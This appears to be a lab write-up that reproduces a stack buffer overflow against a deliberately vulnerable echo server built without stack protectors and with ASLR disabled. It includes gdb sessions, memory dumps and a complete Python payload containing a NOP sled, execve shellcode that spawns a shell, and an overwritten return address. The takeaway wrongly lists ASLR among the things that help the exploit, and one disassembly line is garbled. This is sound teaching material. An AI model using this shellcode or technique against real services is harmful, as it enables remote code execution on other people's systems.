# How to recreate the exploit

## What you need:
- A 64-bit unix based system (we are using ubuntu 18.04.2)
- Root access to the system
- a C compoler (we are using gcc version 5.4.0)
- gdb


1. Clone from the repo

```
$ git clone ...
```

2. Disable ASLR

- get from the readme


3.  Start by compiling the files. A makefile is provided:

```
Server_sys $ make
```

The makefile disables stack protectors in the server.c.

4. Write a .gdbinit file:
This file reduces the amount of environmental variables we have and set the disassebly style to intel as opposed to AT&T which is the default.
```
Server_sys $ cd ~
Server_sys $ printf "unset env COLUMNS\nunset env LINES\nset disassembly-flavor intel" >> ~/.gdbinit  
```

5. Start up the server with gdb and run:
Make sure to use the absolute address because using relative addresses changes memory allocation as well because additional environment variable will be added.

```
Server_sys $ gdb /home/user/team_hackerman-master/server.exec
(gdb) break *echo_msg              // set a break point to our function echo_msg()
(gdb) r				   // run program; the server should now be listening for connection

```

6. Send the payload through the client program
```
Client_sys $ python2 ../payload.py | ./client [ip_address] 
// if connecting locally ip_address is 0.0.0.0
// Make sure to use python2 because the payload evaluates differently in python3
```

Now the breakpoint shoud be hit.

7. Analysis

move down to the fourth instruction:
```
(gdb) ni
0x000000000040096d in echo_msg ()
(gdb) ni
0x0000000000400970 in echo_msg ()
(gdb) ni
0x0000000000400977 in echo_msg ()
(gdb) ni
0x000000000040097e in echo_msg ()
```

disassemble the echo_msg():
```
(gdb) disass echo_msg 
```

You should see something like this, this is before the exploit:
```
Dump of assembler code for function echo_msg:
   0x000000000040096c <+0>:	push   rbp
   0x000000000040096d <+1>:	mov    rbp,rsp
   0x0000000000400970 <+4>:	sub    rsp,0x90
   0x0000000000400977 <+11>:	mov    QWORD PTR [rbp-0x88],rdi
=> 0x000000000040097e <+18>:	mov    rdx,QWORD PTR [rbp-0x88]
   0x0000000000400985 <+25>:	lea    rax,[rbp-0x80]
   0x0000000000400989 <+29>:	mov    rsi,rdx
   0x000000000040098c <+32>:	mov    rdi,rax
   0x000000000040098f <+35>:	call   0x400740 <strcpy@plt>
   0x0000000000400994 <+40>:	nop
   0x0000000000400995 <+41>:	leave  
   0x0000000000400996 <+42>:	ret    
End of assembler dump.
```

We can see our payload at 0x00007fffffffd4f0 about to be written in:

```
(gdb) x/144x $rsp
0x7fffffffd450:	0x00000000	0x00000000	0xffffd4f0	0x00007fff
0x7fffffffd460:	0x00603010	0x00000000	0xffffde30	0x00007fff
0x7fffffffd470:	0x00000000	0x00000000	0xf7a87409	0x00007fff
0x7fffffffd480:	0xffffd4f0	0x00007fff	0x7fffff71	0x00000000
0x7fffffffd490:	0x00000004	0x00000000	0x00400cf8	0x00000000
0x7fffffffd4a0:	0xffffd4f0	0x00007fff	0x00000000	0x00000000
0x7fffffffd4b0:	0x0000008e	0x00000000	0xf7dd2620	0x00007fff
0x7fffffffd4c0:	0x00400ce3	0x00000000	0xf7a7c7fa	0x00007fff
0x7fffffffd4d0:	0x00000000	0x00000000	0xf7ffe168	0x00007fff
0x7fffffffd4e0:	0xffffdd30	0x00007fff	0x00400b11	0x00000000
0x7fffffffd4f0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd500:	0x90909090	0x90909090	0x90909090	0xc0319090
0x7fffffffd510:	0x9dd1bb48	0x8cd09196	0xf748ff97	0x5f5453db
0x7fffffffd520:	0x54575299	0x0f3bb05e	0x90909005	0x90909090
0x7fffffffd530:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd540:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd550:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd560:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd570:	0x90909090	0x90909090	0xffffdb40	0x00007fff
0x7fffffffd580:	0xffffd5f8	0x00007fff	0x00000000	0x00000000
0x7fffffffd590:	0x00000000	0x00000001	0xf7ffed60	0x00007fff
0x7fffffffd5a0:	0x00000000	0x00000000	0x0000000a	0x00000000
0x7fffffffd5b0:	0xffffd620	0x00007fff	0xffffd5f0	0x00007fff
---Type <return> to continue, or q <return> to quit---
0x7fffffffd5c0:	0xf7ffe168	0x00007fff	0x00000000	0x00000000
0x7fffffffd5d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffd5e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffd5f0:	0xf7ffed60	0x00007fff	0xffffde30	0x00007fff
0x7fffffffd600:	0x00000340	0x00000000	0x464c457f	0x03010102
0x7fffffffd610:	0x00000000	0x00000000	0x003e0003	0x00000001
0x7fffffffd620:	0x00020950	0x00000000	0x00000040	0x00000000
0x7fffffffd630:	0x001c72b8	0x00000000	0x00000000	0x00380040
0x7fffffffd640:	0x0040000a	0x00470048	0x00000006	0x00000005
0x7fffffffd650:	0x00000040	0x00000000	0x00000040	0x00000000
0x7fffffffd660:	0x00000040	0x00000000	0x00000230	0x00000000
0x7fffffffd670:	0x00000230	0x00000000	0x00000008	0x00000000
0x7fffffffd680:	0x00000003	0x00000004	0x00196660	0x00000000

(gdb) x/s 0x00007fffffffd4f0         // you can run this to check our payload
0x7fffffffd4f0:	'\220' <repeats 30 times>, "\061\300H\273ѝ\226\221Ќ\227\377H\367\333ST_\231RWT^\260;\017\005", '\220' <repeats 79 times>, "@\333\377\377\377\177"

```

Set a new breakpoint and continue to where our payload has been injected.

```
(gdb) break *echo_msg+40
Breakpoint 2 at 0x400994
(gdb) c
Continuing.

Breakpoint 2, 0x0000000000400994 in echo_msg ()
```


We can see where our injection is being written to after strcopy. In our case it is at 0x7fffffffd460.

```
(gdb) disass echo_msg 
Dump of assembler code for function echo_msg:
   0x000000000040096c <+0>:	push   rbp
   0x000000000040096d <+1>:	mov    rbp,rsp
   0x0000000000400970 <+4>:	sub    rsp,0x90
   0x0000000000400977 <+11>:	mov    QWORD PTR [rbp-0x88],rdi
   0x000000000040097e <+18>:	mov    rdx,QWORD PTR [rbp-0x88]
   0x0000000000400985 <+25>:	lea    rax,[rbp-0x80]
   0x0000000000400989 <+29>:	mov    rsi,rdx
   0x000000000040098c <+32>:	mov    rdi,rax
   0x000000000040098f <+35>:	call   0x400740 <strcpy@plt>
=> 0x0000000000400994 <+40>:	nop
   0x0000000000400995x/144wx $rsp <+41>:	leave  
   0x0000000000400996 <+42>:	ret    
End of assembler dump.
(gdb) x/144wx $rsp
0x7fffffffd450:	0x00000000	0x00000000	0xffffd4f0	0x00007fff
0x7fffffffd460:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd470:	0x90909090	0x90909090	0x90909090	0xc0319090
0x7fffffffd480:	0x9dd1bb48	0x8cd09196	0xf748ff97	0x5f5453db
0x7fffffffd490:	0x54575299	0x0f3bb05e	0x90909005	0x90909090
0x7fffffffd4a0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd4b0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd4c0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd4d0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd4e0:	0x90909090	0x90909090	0xffffdb40	0x00007fff
0x7fffffffd4f0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd500:	0x90909090	0x90909090	0x90909090	0xc0319090
0x7fffffffd510:	0x9dd1bb48	0x8cd09196	0xf748ff97	0x5f5453db
0x7fffffffd520:	0x54575299	0x0f3bb05e	0x90909005	0x90909090
0x7fffffffd530:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd540:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd550:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd560:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffd570:	0x90909090	0x90909090	0xffffdb40	0x00007fff
0x7fffffffd580:	0xffffd5f8	0x00007fff	0x00000000	0x00000000
0x7fffffffd590:	0x00000000	0x00000001	0xf7ffed60	0x00007fff
0x7fffffffd5a0:	0x00000000	0x00000000	0x0000000a	0x00000000
0x7fffffffd5b0:	0xffffd620	0x00007fff	0xffffd5f0	0x00007fff
0x7fffffffd5c0:	0xf7ffe168	0x00007fff	0x00000000	0x00000000
0x7fffffffd5d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffd5e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffd5f0:	0xf7ffed60	0x00007fff	0xffffde30	0x00007fff
0x7fffffffd600:	0x00000340	0x00000000	0x464c457f	0x03010102
0x7fffffffd610:	0x00000000	0x00000000	0x003e0003	0x00000001
0x7fffffffd620:	0x00020950	0x00000000	0x00000040	0x00000000
0x7fffffffd630:	0x001c72b8	0x00000000	0x00000000	0x00380040
0x7fffffffd640:	0x0040000a	0x00470048	0x00000006	0x00000005
0x7fffffffd650:	0x00000040	0x00000000	0x00000040	0x00000000
0x7fffffffd660:	0x00000040	0x00000000	0x00000230	0x00000000
0x7fffffffd670:	0x00000230	0x00000000	0x00000008	0x00000000
0x7fffffffd680:	0x00000003	0x00000004	0x00196660	0x00000000
```

If we continue, this will cause a segfault. This is because the return address in the payload doesn't go to the right location.
```
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
```

We want to modify our payload so it goes to the top of our nop slide, which we found to be at 0x7fffffffd460. 

We go into the payload and modify the return address to correspond to the right location.
```
$ cat payload.py
buf = b"\x90"*30
buf += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
buf += b"\x90"*(136-len(buf)) + b"\x00\x00\x7f\xff\xff\xff\xd4\x64"[::-1] // the second half of this string is the return address
    
print(buf)
```

8. Try it again! Exploit should work now

9. 




## Takeaway
Memory exploits are hard for many reason.


1. Memory allocation changes for many reasons:
- injection with environemntal variables when using programs like gdb
- running from a relative path, for the same reason above.
- changes with the user that runs it

Things that helps with the exploit:
- Nop slope
- ASLR 

